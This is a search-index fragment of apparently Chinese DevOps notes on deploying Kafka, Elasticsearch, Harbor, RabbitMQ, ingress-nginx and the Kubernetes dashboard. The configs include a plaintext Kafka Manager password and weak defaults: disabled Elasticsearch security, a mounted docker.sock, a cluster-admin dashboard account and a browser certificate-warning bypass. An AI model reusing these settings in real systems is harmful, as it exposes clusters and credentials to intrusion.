docker\n\ncat &gt; /etc/docker/daemon.json &lt;&lt;EOF\n{\n  \"insecure-registries\": [\n    \"hub.8ops.top\"\n  ]\n}\nEOF\n\ndocker pull hub.8ops.top/middleware/zookeeper:3.9.2\ndocker pull hub.8ops.top/bitnami/kafka:3.6.2\n</code></pre>"},{"location":"kubernetes/25-elastic/#622-kafka","title":"6.2.2 \u5b89\u88c5kafka","text":"<p>Reference</p> <pre><code>cat &gt; docker-compose.yaml &lt;&lt;EOF\nservices:\n  zookeeper:\n    image: 'hub.8ops.top/middleware/zookeeper:3.9.2'\n    restart: always\n    container_name: zookeeper\n    network_mode: host\n    ports:\n      - 2181:2181\n      - 2888:2888\n      - 3888:3888\n    environment:\n      ZOO_MY_ID: 1\n      ZOO_SERVERS: server.1=10.131.1.237:2888:3888;2181 server.2=10.131.1.224:2888:3888;2181 server.3=10.131.1.209:2888:3888;2181\n\n  kafka:\n    image: 'hub.8ops.top/bitnami/kafka:3.6.2'\n    restart: always\n    container_name: kafka\n    network_mode: host\n    ports:\n      - 9092:9092\n    environment:\n      - KAFKA_CFG_ZOOKEEPER_CONNECT=10.131.1.237:2181,10.131.1.224:2181,10.131.1.209:2181\n      - ALLOW_PLAINTEXT_LISTENER=yes\n      - KAFKA_BROKER_ID=1\n      - KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://10.131.1.237:9092\n      - KAFKA_LISTENERS=PLAINTEXT://0.0.0.0:9092\n      - KAFKA_CFG_NUM_PARTITIONS=3\n      - KAFKA_CFG_OFFSETS_TOPIC_REPLICATION_FACTOR=2\n      - KAFKA_LOG_DIRS=/kafka/kafka-logs\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    depends_on:\n      - zookeeper\n\nEOF\n\ndocker compose down\n\ndocker compose up -d\n</code></pre>"},{"location":"kubernetes/25-elastic/#623-kafka","title":"6.2.3 \u6d4b\u8bd5kafka","text":"<p>\u529f\u80fd\u6d4b\u8bd5</p> <pre><code># detect zookeeper\ndocker logs zookeeper\ndocker exec -it zookeeper bin/zkServer.sh status\n\n# detect kafka topic\ndocker logs kafka\n\n# producter &amp; consumer\n# /opt/bitnami/kafka/bin/kafka-topics.sh\nexport BOOTSTRAP_SERVER=10.131.1.237:9092,10.131.1.224:9092,10.131.1.209:9092 \n\ndocker exec -it kafka-client kafka-topics.sh --list --bootstrap-server ${BOOTSTRAP_SERVER}\n\ndocker exec -it kafka-client kafka-topics.sh --create --topic test-topic --bootstrap-server ${BOOTSTRAP_SERVER} --replication-factor 2 --partitions 2\n\ndocker exec -it kafka-client kafka-topics.sh --describe --topic test-topic --bootstrap-server ${BOOTSTRAP_SERVER}\n\ndocker exec -it kafka-client kafka-topics.sh --alter --topic test-topic --partitions 3 --bootstrap-server ${BOOTSTRAP_SERVER}\n\ndocker exec -it kafka-client kafka-topics.sh --create --topic test-topic-02 --bootstrap-server ${BOOTSTRAP_SERVER} --replication-factor 1 --partitions 1\n\ndocker exec -it kafka-client kafka-topics.sh --delete --topic test-topic-02 --bootstrap-server ${BOOTSTRAP_SERVER}\n\n# detect kafka consumer\ndocker exec -it kafka-client kafka-consumer-groups.sh --list --bootstrap-server ${BOOTSTRAP_SERVER}\n\ndocker exec -it kafka-client kafka-consumer-groups.sh --describe --all-groups --bootstrap-server ${BOOTSTRAP_SERVER}\n</code></pre> <p>\u6027\u80fd\u6d4b\u8bd5</p> <pre><code># producer\ndocker exec -it kafka-client kafka-producer-perf-test.sh \\\n    --topic test-topic \\\n    --num-records 10000000 \\\n    --record-size 100 \\\n    --throughput 1000000 \\\n    --producer-props \\\n    acks=1 \\\n    bootstrap.servers=${BOOTSTRAP_SERVER}\n\n10000000 records sent, 269578.110257 records/sec (25.71 MB/sec), 2.11 ms avg latency, 378.00 ms max latency, 1 ms 50th, 2 ms 95th, 30 ms 99th, 116 ms 99.9th.\n\n# consumer\ndocker exec -it kafka-client kafka-consumer-perf-test.sh \\\n    --bootstrap-server ${BOOTSTRAP_SERVER}  \\\n    --topic test-topic \\\n    --fetch-size 1048576 \\\n    --messages 10000000 \\\n    --consumer.config /opt/bitnami/kafka/config/consumer.properties\n\nstart.time, end.time, data.consumed.in.MB, MB.sec, data.consumed.in.nMsg, nMsg.sec, rebalance.time.ms, fetch.time.ms, fetch.MB.sec, fetch.nMsg.sec\n2024-06-27 09:44:58:834, 2024-06-27 09:45:07:905, 953.6911, 105.1363, 10000176, 1102433.6898, 3411, 5660, 168.4967, 1766815.5477\n</code></pre>"},{"location":"kubernetes/25-elastic/#624-elastic","title":"6.2.4 \u5b89\u88c5elastic","text":"<p>Reference</p> <pre><code># sysctl\ncat &gt;&gt; /etc/sysctl.d/99-sysctl.conf &lt;&lt;EOF\nvm.max_map_count = 262144\nfs.file-max = 655360\nEOF\n\nsysctl -p\nsysctl vm.max_map_count fs.file-max\n\nmkdir -p /data1/lib/elastic\nchown 1000 /data1/lib/elastic\n\nexport SEED_HOSTS=10.131.1.237:9300,10.131.1.224:9300,10.131.1.209:9300\nexport MASTER_NODES=10.131.1.237,10.131.1.224,10.131.1.209\n\n# master/client - \u673a\u5668\u590d\u7528\ncat &gt;&gt; docker-compose.yaml &lt;&lt;EOF\n\n  elasticsearch:\n    image: hub.8ops.top/elastic/elasticsearch:7.17.22\n    restart: always\n    container_name: es-master\n    network_mode: host\n    environment:\n      - node.name=es-master-01\n      - node.roles=master,ingest\n      - cluster.name=es-docker-cluster\n      - discovery.seed_hosts=${SEED_HOSTS}\n      - cluster.initial_master_nodes=${MASTER_NODES}\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=false\n      - xpack.security.http.ssl.enabled=false\n      - \"ES_JAVA_OPTS=-Xms2g -Xmx2g\"\n      - network.host=0.0.0.0\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n      nofile:\n        soft: 655360\n        hard: 655360\n    volumes:\n      - /data1/lib/elastic:/usr/share/elasticsearch/data\n    ports:\n      - 9200:9200\n      - 9300:9300\n\nEOF\n\ndocker compose up -d\n\n# data\ncat &gt; docker-compose.yaml &lt;&lt;EOF\nservices:\n  elasticsearch:\n    image: hub.8ops.top/elastic/elasticsearch:7.17.22\n    restart: always\n    container_name: es-data\n    network_mode: host\n    environment:\n      - node.name=es-data-01\n      - node.roles=data\n      - cluster.name=es-docker-cluster\n      - discovery.seed_hosts=${SEED_HOSTS}\n      - cluster.initial_master_nodes=${MASTER_NODES}\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=false\n      - xpack.security.http.ssl.enabled=false\n      - \"ES_JAVA_OPTS=-Xms32g -Xmx32g\"\n      - network.host=0.0.0.0\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n      nofile:\n        soft: 655360\n        hard: 655360\n    volumes:\n      - /data1/lib/elastic:/usr/share/elasticsearch/data\n    ports:\n      - 9200:9200\n      - 9300:9300\n\nEOF\n\ndocker compose up -d\n\n#      # \u4e24\u79cd\u89d2\u8272\u65b9\u5f0f\u90fd\u53ef\u4ee5\n#      - node.roles=master,ingest,data,ml\n#      \n#      OR\n#\n#      - node.master=false\n#      - node.data=true\n#      - node.ingest=false\n#      - node.ml=false\n</code></pre>"},{"location":"kubernetes/25-elastic/#625-elastic","title":"6.2.5 \u6d4b\u8bd5elastic","text":"<pre><code>docker logs -f es-docker-cluster-data\n\npip install esrally\n\nexport ELASTIC_SERVER=10.131.1.237:9200,10.131.1.224:9200,10.131.1.209:9200\n\n# list tracks\nesrally list tracks\n\nesrally race --track=geonames --target-hosts=${ELASTIC_SERVER} --pipeline=benchmark-only --client-options=\"use_ssl:false\" --on-error=abort --test-mode\n\nesrally race --track=geonames --target-hosts=${ELASTIC_SERVER} --pipeline=benchmark-only --client-options=\"timeout:60\"\n\nesrally race --track=geonames --target-hosts=${ELASTIC_SERVER} --pipeline=benchmark-only --report-file=report.md --report-format=markdown --quiet\n\n# challenge\nesrally race --distribution-version=7.17.22 --track=geonames --target-hosts=${ELASTIC_SERVER} --challenge=append-no-conflicts\n\nesrally race --track=geonames --target-hosts=${BOOTSTRAP_SERVER} --pipeline=benchmark-only\n\nesrally race --track=geonames --kill-running-processes\n\n# Deprecated\ndocker run --name esrally --rm -it -e ENDPOINT=\"${ELASTIC_SERVER}\" hub.8ops.top/elastic/esrally:053\n</code></pre>"},{"location":"kubernetes/25-elastic/#626","title":"6.2.6 \u8f85\u52a9\u5de5\u5177","text":"<pre><code># kafka_manager\u3001kibana\u3001elastic ui\ncat &gt; docker-compose.yaml &lt;&lt;EOF\nservices:\n  kafka-client:\n    image: 'hub.8ops.top/bitnami/kafka:3.6.2'\n    container_name: kafka-client\n    network_mode: host\n    command: [\"sleep\",\"infinity\"]\n\n  kafka-manager:\n    image: hub.8ops.top/middleware/kafka-manager:3.0.0.5\n    container_name: kafka-manager\n    network_mode: host\n    ports:\n      - \"9000:9000\"\n    environment:\n      ZK_HOSTS: \"10.131.1.237:2181,10.131.1.224:2181,10.131.1.209:2181\"\n      KAFKA_BROKERS: \"10.131.1.237:9092,10.131.1.224:9092,10.131.1.209:9092\"\n      APPLICATION_SECRET: \"random-secret\"\n      KAFKA_MANAGER_AUTH_ENABLED: \"true\"\n      KAFKA_MANAGER_USERNAME: jesse\n      KAFKA_MANAGER_PASSWORD: xqp4AtsTEBjj4rKJvhyY5XBN340\n\n  kibana:\n    image: hub.8ops.top/elastic/kibana:7.17.22\n    container_name: kibana\n    network_mode: host\n    ports:\n      - \"5601:5601\"\n    environment:\n      - ELASTICSEARCH_HOSTS=[\"http://10.131.1.237:9200\",\"http://10.131.1.224:9200\",\"http://10.131.1.209:9200\"]\n\nEOF\n\ndocker compose up -d\n</code></pre>"},{"location":"kubernetes/25-elastic/#627","title":"6.2.7 \u4f18\u5316\u914d\u7f6e","text":"<pre><code># kafka\n\n# vector\n\n# elasticsearch\n# 1\uff0c\u7d22\u5f15\u81ea\u52a8\u5206\u7247\n# 2\uff0cILM\n</code></pre>"},{"location":"kubernetes/26-harbor/","title":"Harbor","text":""},{"location":"kubernetes/26-harbor/#_1","title":"\u4e00\u3001\u4e0b\u8f7d","text":"<p>\u4e0b\u8f7d\u6700\u65b0\u7684 harbor-offline-installer-vx.x.x.tgz \u7248\u672c</p>"},{"location":"kubernetes/26-harbor/#_2","title":"\u4e8c\u3001\u7f16\u8f91\u914d\u7f6e","text":"<pre><code># cp harbor.yml.tmpl harbor.yml\n# vim harbor.yml\n\n\u2026\u2026\nhostname: reg.mydomain.com\n\u2026\u2026\nhttps:\n  port: 443\n  certificate: /your/certificate/path\n  private_key: /your/private/key/path  \n\u2026\u2026\n\ndata_volume: /data\n\n\u2026\u2026\nmetric:\n  enabled: true\n  port: 9090\n  path: /metrics\n</code></pre>"},{"location":"kubernetes/26-harbor/#_3","title":"\u4e09\u3001\u9884\u5904\u7406","text":"<pre><code># ./prepare --with-notary --with-trivy --with-chartmuseum\n./install.sh --with-notary --with-trivy --with-chartmuseum\n</code></pre>"},{"location":"kubernetes/26-harbor/#_4","title":"\u56db\u3001\u5b89\u88c5","text":"<pre><code>docker-compose up -d\n</code></pre>"},{"location":"kubernetes/27-kong/","title":"Kong","text":"<p>Reference</p>"},{"location":"kubernetes/28-rabbitmq/","title":"Rabbitmq","text":"<p>https://www.rabbitmq.com/configure.html</p> <p>https://www.rabbitmq.com/clustering.html</p> <p>http://www.blogjava.net/qbna350816/archive/2016/07/30/431392.html</p> <p>https://www.kubernetes.org.cn/2629.html</p>"},{"location":"kubernetes/28-rabbitmq/#rbac","title":"rbac","text":"<pre><code>---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: rabbitmq\n  namespace: bs\n---\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: endpoint-reader\n  namespace: bs\nrules:\n- apiGroups: [\"\"]\n  resources: [\"endpoints\"]\n  verbs: [\"get\"]\n---\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: endpoint-reader\n  namespace: bs\nsubjects:\n- kind: ServiceAccount\n  name: rabbitmq\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: Role\n  name: endpoint-reader\n</code></pre>"},{"location":"kubernetes/28-rabbitmq/#statefulsets","title":"statefulsets","text":"<pre><code>kind: Service\napiVersion: v1\nmetadata:\n  namespace: bs\n  name: rabbitmq\n  labels:\n    app: rabbitmq\n    type: LoadBalancer\nspec:\n  type: NodePort\n  ports:\n   - name: http\n     protocol: TCP\n     port: 15672\n     targetPort: 15672\n     nodePort: 31672\n   - name: amqp\n     protocol: TCP\n     port: 5672\n     targetPort: 5672\n     nodePort: 30672\n  selector:\n    app: rabbitmq\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: rabbitmq-config\n  namespace: bs\ndata:\n  enabled_plugins: |\n      [rabbitmq_management,rabbitmq_peer_discovery_k8s].\n\n  rabbitmq.conf: |\n      ## Cluster formation. See https://www.rabbitmq.com/cluster-formation.html to learn more.\n      cluster_formation.peer_discovery_backend  = rabbit_peer_discovery_k8s\n      cluster_formation.k8s.host = kubernetes.default.svc.cluster.local\n      ## Should RabbitMQ node name be computed from the pod's hostname or IP address?\n      ## IP addresses are not stable, so using [stable] hostnames is recommended when possible.\n      ## Set to \"hostname\" to use pod hostnames.\n      ## When this value is changed, so should the variable used to set the RABBITMQ_NODENAME\n      ## environment variable.\n      cluster_formation.k8s.address_type = hostname\n      ## How often should node cleanup checks run?\n      cluster_formation.node_cleanup.interval = 30\n      ## Set to false if automatic removal of unknown/absent nodes\n      ## is desired. This can be dangerous, see\n      ##  * https://www.rabbitmq.com/cluster-formation.html#node-health-checks-and-cleanup\n      ##  * https://groups.google.com/forum/#!msg/rabbitmq-users/wuOfzEywHXo/k8z_HWIkBgAJ\n      cluster_formation.node_cleanup.only_log_warning = true\n      cluster_partition_handling = autoheal\n      ## See https://www.rabbitmq.com/ha.html#master-migration-data-locality\n      queue_master_locator=min-masters\n      ## See https://www.rabbitmq.com/access-control.html#loopback-users\n      loopback_users.guest = false\n\n      vm_memory_high_watermark.absolute = 2GB\n      disk_free_limit.absolute = 10GB\n      vm_memory_high_watermark_paging_ratio = 0.8\n      log.file.level = error\n\n---\napiVersion: apps/v1beta1\nkind: StatefulSet\nmetadata:\n  name: rabbitmq\n  namespace: bs\nspec:\n  serviceName: rabbitmq\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n    spec:\n      serviceAccountName: rabbitmq\n      terminationGracePeriodSeconds: 10\n      containers:\n      - name: rabbitmq-k8s\n        image: rabbitmq:3.7.17\n        resources:\n          limits:\n            cpu: 1\n            memory: 2048Mi\n          requests:\n            cpu: 0.1\n            memory: 512Mi\n        volumeMounts:\n          - name: config-volume\n            mountPath: /etc/rabbitmq\n        ports:\n          - name: http\n            protocol: TCP\n            containerPort: 15672\n          - name: amqp\n            protocol: TCP\n            containerPort: 5672\n        livenessProbe:\n          exec:\n            command: [\"rabbitmqctl\", \"status\"]\n          initialDelaySeconds: 60\n          # See https://www.rabbitmq.com/monitoring.html for monitoring frequency recommendations.\n          periodSeconds: 60\n          timeoutSeconds: 15\n        readinessProbe:\n          exec:\n            command: [\"rabbitmqctl\", \"status\"]\n          initialDelaySeconds: 20\n          periodSeconds: 60\n          timeoutSeconds: 10\n        imagePullPolicy: Always\n        env:\n          - name: MY_POD_NAME\n            valueFrom:\n              fieldRef:\n                apiVersion: v1\n                fieldPath: metadata.name\n          - name: MY_POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: MY_POD_SERVICE_ACCOUNT\n            valueFrom:\n              fieldRef:\n                fieldPath: spec.serviceAccountName\n          - name: RABBITMQ_USE_LONGNAME\n            value: \"true\"\n          # See a note on cluster_formation.k8s.address_type in the config file section\n          - name: RABBITMQ_NODENAME\n            value: rabbit@$(MY_POD_NAME).$(MY_POD_SERVICE_ACCOUNT).$(MY_POD_NAMESPACE).svc.cluster.local\n          - name: K8S_HOSTNAME_SUFFIX\n            value: .$(MY_POD_SERVICE_ACCOUNT).$(MY_POD_NAMESPACE).svc.cluster.local\n          - name: K8S_SERVICE_NAME\n            value: $(MY_POD_SERVICE_ACCOUNT)\n          - name: RABBITMQ_ERLANG_COOKIE\n            value: \"mycookie\"\n      volumes:\n        - name: config-volume\n          configMap:\n            name: rabbitmq-config\n            items:\n            - key: rabbitmq.conf\n              path: rabbitmq.conf\n            - key: enabled_plugins\n              path: enabled_plugins\n</code></pre>"},{"location":"kubernetes/28-rabbitmq/#cmd","title":"cmd","text":"<pre><code>rabbitmqctl status\n\n[{pid,236},\n {running_applications,\n     [{rabbitmq_management,\"RabbitMQ Management Console\",\"3.7.17\"},\n      {rabbitmq_web_dispatch,\"RabbitMQ Web Dispatcher\",\"3.7.17\"},\n      {cowboy,\"Small, fast, modern HTTP server.\",\"2.6.1\"},\n      {cowlib,\"Support library for manipulating Web protocols.\",\"2.7.0\"},\n      {amqp_client,\"RabbitMQ AMQP Client\",\"3.7.17\"},\n      {rabbitmq_peer_discovery_k8s,\n          \"Kubernetes-based RabbitMQ peer discovery backend\",\"3.7.17\"},\n      {rabbitmq_management_agent,\"RabbitMQ Management Agent\",\"3.7.17\"},\n      {rabbitmq_peer_discovery_common,\n          \"Modules shared by various peer discovery backends\",\"3.7.17\"},\n      {rabbit,\"RabbitMQ\",\"3.7.17\"},\n      {rabbit_common,\n          \"Modules shared by rabbitmq-server and rabbitmq-erlang-client\",\n          \"3.7.17\"},\n      {ranch,\"Socket acceptor pool for TCP protocols.\",\"1.7.1\"},\n      {ssl,\"Erlang/OTP SSL application\",\"9.3.5\"},\n      {public_key,\"Public key infrastructure\",\"1.6.7\"},\n      {asn1,\"The Erlang ASN1 compiler version 5.0.9\",\"5.0.9\"},\n      {mnesia,\"MNESIA  CXC 138 12\",\"4.16\"},\n      {stdout_formatter,\n          \"Tools to format paragraphs, lists and tables as plain text\",\n          \"0.2.2\"},\n      {jsx,\"a streaming, evented json parsing toolkit\",\"2.9.0\"},\n      {observer_cli,\"Visualize Erlang Nodes On The Command Line\",\"1.5.0\"},\n      {xmerl,\"XML parser\",\"1.3.21\"},\n      {crypto,\"CRYPTO\",\"4.5.1\"},\n      {inets,\"INETS  CXC 138 49\",\"7.0.9\"},\n      {sysmon_handler,\"Rate-limiting system_monitor event handler\",\"1.1.0\"},\n      {os_mon,\"CPO  CXC 138 46\",\"2.5\"},\n      {recon,\"Diagnostic tools for production use\",\"2.5.0\"},\n      {lager,\"Erlang logging framework\",\"3.6.10\"},\n      {goldrush,\"Erlang event stream processor\",\"0.1.9\"},\n      {compiler,\"ERTS  CXC 138 10\",\"7.4.4\"},\n      {syntax_tools,\"Syntax tools\",\"2.2\"},\n      {sasl,\"SASL  CXC 138 11\",\"3.4\"},\n      {stdlib,\"ERTS  CXC 138 10\",\"3.9.2\"},\n      {kernel,\"ERTS  CXC 138 10\",\"6.4.1\"}]},\n {os,{unix,linux}},\n {erlang_version,\n     \"Erlang/OTP 22 [erts-10.4.4] [source] [64-bit] [smp:20:20] [ds:20:20:10] [async-threads:320]\\n\"},\n {memory,\n     [{connection_readers,0},\n      {connection_writers,0},\n      {connection_channels,0},\n      {connection_other,2732},\n      {queue_procs,0},\n      {queue_slave_procs,0},\n      {plugins,1692252},\n      {other_proc,22360772},\n      {metrics,208948},\n      {mgmt_db,186936},\n      {mnesia,84264},\n      {other_ets,2841448},\n      {binary,226832},\n      {msg_index,31760},\n      {code,27517311},\n      {atom,1221849},\n      {other_system,20547936},\n      {allocated_unused,35446624},\n      {reserved_unallocated,0},\n      {strategy,rss},\n      {total,[{erlang,76923040},{rss,102756352},{allocated,112369664}]}]},\n {alarms,[]},\n {listeners,[{clustering,25672,\"::\"},{amqp,5672,\"::\"},{http,15672,\"::\"}]},\n {vm_memory_calculation_strategy,rss},\n {vm_memory_high_watermark,0.4},\n {vm_memory_limit,26914172108},\n {disk_free_limit,50000000},\n {disk_free,4923085348864},\n {file_descriptors,\n     [{total_limit,65436},\n      {total_used,2},\n      {sockets_limit,58890},\n      {sockets_used,0}]},\n {processes,[{limit,1048576},{used,412}]},\n {run_queue,1},\n {uptime,635},\n {kernel,{net_ticktime,60}}]\n\n\nrabbitmqctl cluster_status\n\nCluster status of node rabbit@rabbitmq-0.rabbitmq.bs.svc.cluster.local ...\n[{nodes,[{disc,['rabbit@rabbitmq-0.rabbitmq.bs.svc.cluster.local',\n                'rabbit@rabbitmq-1.rabbitmq.bs.svc.cluster.local',\n                'rabbit@rabbitmq-2.rabbitmq.bs.svc.cluster.local']}]},\n {running_nodes,['rabbit@rabbitmq-1.rabbitmq.bs.svc.cluster.local',\n                 'rabbit@rabbitmq-2.rabbitmq.bs.svc.cluster.local',\n                 'rabbit@rabbitmq-0.rabbitmq.bs.svc.cluster.local']},\n {cluster_name,&lt;&lt;\"rabbit@rabbitmq-0.rabbitmq.bs.svc.cluster.local\"&gt;&gt;},\n {partitions,[]},\n {alarms,[{'rabbit@rabbitmq-1.rabbitmq.bs.svc.cluster.local',[]},\n          {'rabbit@rabbitmq-2.rabbitmq.bs.svc.cluster.local',[]},\n          {'rabbit@rabbitmq-0.rabbitmq.bs.svc.cluster.local',[]}]}]\n\n\nrabbitmqctl stop_app;rabbitmqctl change_cluster_node_type ram;rabbitmqctl start_app\n</code></pre>"},{"location":"kubernetes/29-controller/","title":"Controller","text":"<p>\u63a8\u8350\u4f7f\u7528helm\u5b89\u88c5\uff0c\u53c2\u8003Helm</p> <p>Kubernetes \u7f16\u6392\u7ba1\u7406\u7684Web\u5e94\u7528\u9700\u8981\u5bf9\u5916\u66b4\u9732\u8bbf\u95ee\uff0c\u8fd9\u79cd\u65b9\u5f0f\u53eb\u6d41\u91cf\u63a7\u5236\u3002</p> <p>\u76ee\u524d\u5e38\u7528\u6d41\u91cf\u63a7\u5236\u7684\u6280\u672f\u6709\u597d\u51e0\u79cd\uff0c\u6574\u7406\u5982\u4e0b</p> <ul> <li>ingress-nginx</li> <li>nginxinc</li> <li>kong</li> <li>traefik</li> <li>haproxy</li> <li>voyager</li> <li>contour</li> <li>istio</li> <li>ambassador</li> <li>gloo</li> <li>skipper</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u6f14\u793a\u4f7f\u7528ingress-nginx</p> <p>\u76f8\u5173\u5f15\u7528</p> <ul> <li>code</li> <li>docs</li> <li>guide</li> <li>nginx</li> <li>configmap</li> <li>metallb</li> </ul> <p>ingress-nginx\u662fgoogle\u5b98\u65b9\u57fa\u4e8enginx\u6700\u65b0\u7248\u672c\uff0c\u901a\u8fc7Lua\u52a8\u6001\u52a0\u8f7dnginx\u914d\u7f6e\uff0c\u5176\u914d\u7f6e\u6765\u6e90\u4e8eingress\u8d44\u6e90\u3002</p>"},{"location":"kubernetes/29-controller/#_1","title":"\u4e00\u3001\u73af\u5883\u8bf4\u660e","text":"\u4e3b\u673a\u540d\u79f0 \u4e3b\u673aIP \u64cd\u4f5c\u7cfb\u7edf \u89d2\u8272\u5206\u914d IngressClass K-KUBE-LAB-01 10.101.11.240 Ubuntu 20.04.2 LTS control-plane,master nginx K-KUBE-LAB-02 10.101.11.146 Ubuntu 20.04.2 LTS control-plane,master external K-KUBE-LAB-03 10.101.11.154 Ubuntu 20.04.2 LTS control-plane,master internal K-KUBE-LAB-04 10.101.11.234 Ubuntu 20.04.2 LTS node K-KUBE-LAB-05 10.101.11.171 Ubuntu 20.04.2 LTS node <p>\u8fd9\u91cc\u4f7f\u75283\u53f0control-plane,master\u8282\u70b9\u5206\u522b\u66b4\u9732\u6d41\u91cf\u3002</p>"},{"location":"kubernetes/29-controller/#_2","title":"\u4e8c\u3001\u542f\u52a8\u63a7\u5236\u5668","text":"<pre><code># \u53d6\u6d88control-plane,master\u8282\u70b9\u4e0d\u53ef\u8c03\u5ea6\nkubectl taint node --all node-role.kubernetes.io/master:NoSchedule-\n\n# \u5206\u522b\u4ececontrol-plane,master\u6253\u6807\u7b7e\nkubectl label node k-kube-lab-01 edge=nginx\nkubectl label node k-kube-lab-02 edge=external\nkubectl label node k-kube-lab-03 edge=internal\n\n# \u5feb\u901f\u521b\u5efaingress-nginx-controller\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller.yaml\n\n# \u79fb\u9664admission and job\nkubectl -n kube-server delete ValidatingWebhookConfiguration/ingress-nginx-admission job.batch/ingress-nginx-admission-create job.batch/ingress-nginx-admission-patch service/ingress-nginx-controller-admission\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p>"},{"location":"kubernetes/29-controller/#_3","title":"\u4e09\u3001\u5b9e\u8df5\u5e94\u7528","text":""},{"location":"kubernetes/29-controller/#31","title":"3.1 \u5feb\u901f\u5e94\u7528","text":"<p>\u521b\u5efa\u591a\u4e2aIngressClass</p> <p>\u5206\u522b\u662f\uff1a</p> <ol> <li>nginx\uff08default\uff09</li> <li>external</li> <li>internal</li> </ol> <pre><code># \u521b\u5efaIngressClass\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/01-ingressclass.yaml\n\n# \u521b\u5efa\u5e94\u7528\uff1a\u65b9\u5f0f\u4e00\uff08\u6b64\u5904\u9009\u7528\uff09\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/02-app-echoserver.yaml\n\n# \u521b\u5efa\u5e94\u7528\uff1a\u65b9\u5f0f\u4e8c\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/02-app-http-echo.yaml\n\n# \u521b\u5efa\u5e94\u7528\uff1a\u65b9\u5f0f\u4e09\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/02-app-nginx.yaml\n\n# \u66b4\u9732\u6d41\u91cf\uff1a\u65b9\u5f0f\u4e00\uff08nginx\uff09\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/03-ing-default.yaml\n\n# \u66b4\u9732\u6d41\u91cf\uff1a\u65b9\u5f0f\u4e8c\uff08external\uff09\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/04-ing-external.yaml\n\n# \u66b4\u9732\u6d41\u91cf\uff1a\u65b9\u5f0f\u4e09\uff08internal\uff09\nkubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/02-ingress-controller/05-ing-internal.yaml\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p>"},{"location":"kubernetes/29-controller/#32","title":"3.2 \u67e5\u770b\u6548\u679c","text":"<pre><code># nginx\uff08default\uff09\ncurl -i -H Host:default.8ops.top http://10.101.11.240/\n\n# external\ncurl -i -k -H Host:external.8ops.top https://10.101.11.146/\n\n# internal\ncurl -i -H Host:internal.8ops.top http://10.101.11.154/\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p></p> <p></p>"},{"location":"kubernetes/29-dashboard/","title":"Dashboard","text":"<p>\u63a8\u8350\u4f7f\u7528helm\u5b89\u88c5\uff0c\u53c2\u8003Helm</p> <p>Kubernetes Cluster \u5b89\u88c5\u597d\u540e\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u9762\u677f\u6765\u53ef\u89c6\u5316\u7ba1\u7406\uff0c\u6b64\u5904\u6211\u4eec\u5f15\u7528\u5b98\u65b9\u7684dashboard\u3002</p> <p>github</p> <p></p>"},{"location":"kubernetes/29-dashboard/#_1","title":"\u4e00\u3001\u5feb\u901f\u5e94\u7528","text":"<p>\u501f\u9274\u5b98\u65b9YAML\u6587\u4ef6\u505a\u8fc7\u4ee5\u4e0b\u8c03\u6574</p> <ol> <li>\u4f7f\u7528\u79c1\u6709\u955c\u50cf</li> <li>\u547d\u540d\u7a7a\u95f4\u590d\u7528kube-system</li> <li>TTL\u65f6\u95f4\u5ef6\u957f1\u5929</li> <li>\u589e\u52a0nodeport-30001\u7528\u4e8e\u66b4\u9732\u670d\u52a1</li> </ol> <pre><code>kubectl apply -f https://books.8ops.top/attachment/kubernetes/addon/01-kube-dashboard.yaml\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p>"},{"location":"kubernetes/29-dashboard/#_2","title":"\u4e8c\u3001\u521b\u5efa\u7528\u6237","text":"<pre><code># \u521b\u5efaSA\nkubectl create serviceaccount dashboard-admin -n kube-system\n\n# \u7ed1\u5b9acluster-admin\nkubectl create clusterrolebinding dashboard-admin \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-system:dashboard-admin\n\n# \u8f93\u51fatoken\nkubectl describe secrets \\\n  -n kube-system $(kubectl -n kube-system get secret | awk '/dashboard-admin/{print $1}')\n</code></pre> <p>\u64cd\u4f5c\u89e3\u8bf4</p> <ol> <li>\u6388\u4e88\u7ba1\u7406\u5458\u6743\u9650\u7528\u4e8e\u901a\u8fc7dashboard\u7ba1\u7406cluster</li> <li>\u83b7\u53d6\u7f51\u9875\u7248\u767b\u5f55token</li> </ol> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p>\u6f14\u793a\u6548\u679c</p> <p>\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee<code>https://10.101.11.240:30001/</code></p> <p></p> <p>\u521b\u5efa\u5b8c\u6210\u540e\u5728**Chrome**\u6d4f\u89c8\u5668\u6253\u5f00\u63d0\u793a\u975e\u5b89\u5168\u7ad9\u70b9\uff0c\u7531\u4e8e\u8bc1\u4e66\u662f\u79c1\u6709\u7684\u6d4f\u89c8\u5668\u65e0\u6cd5\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u9875\u9762\u4e0a\u76f2\u6572\u547d\u4ee4**thisisunsafe**\u6210\u529f\u6253\u5f00\u7f51\u9875\u3002</p> 